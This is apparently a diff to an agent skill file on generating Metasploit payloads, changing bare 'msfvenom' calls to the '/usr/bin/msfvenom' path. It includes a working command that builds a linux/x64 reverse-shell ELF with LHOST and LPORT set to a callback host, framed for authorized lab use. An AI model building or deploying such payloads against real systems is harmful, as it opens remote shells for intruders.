@@ -5,12 +5,14 @@ description: Select and generate Metasploit payload artifacts with explicit plat
 
 # Choose the artifact's execution contract
 
+Installed invocation: `/usr/bin/msfvenom`.
+
 Read this entire file before acting. Select the payload and inspect its required options before generating bytes. Finish with the payload identity, supplied options, format and saved artifact; generation does not establish delivery, execution or a session.
 
 ~~~bash
-msfvenom --list payloads
-msfvenom --list formats
-msfvenom -p linux/x64/shell_reverse_tcp --list-options
+/usr/bin/msfvenom --list payloads
+/usr/bin/msfvenom --list formats
+/usr/bin/msfvenom -p linux/x64/shell_reverse_tcp --list-options
 ~~~
 
 The last command is an example of option inspection; choose a payload matching the authorized task. An ELF executable, raw shellcode, a script and a language-formatted byte array require different consumers. Renaming the output does not convert it. Inspect architecture and platform from the payload metadata rather than trying random output extensions.
@@ -19,7 +21,7 @@ For a selected lab reverse-shell artifact, define `callback_host` as the address
 
 ~~~bash
 umask 077
-msfvenom -p linux/x64/shell_reverse_tcp \
+/usr/bin/msfvenom -p linux/x64/shell_reverse_tcp \
   LHOST="$callback_host" LPORT="$callback_port" -f elf -o "$artifact"
 file "$artifact"
 sha256sum "$artifact"
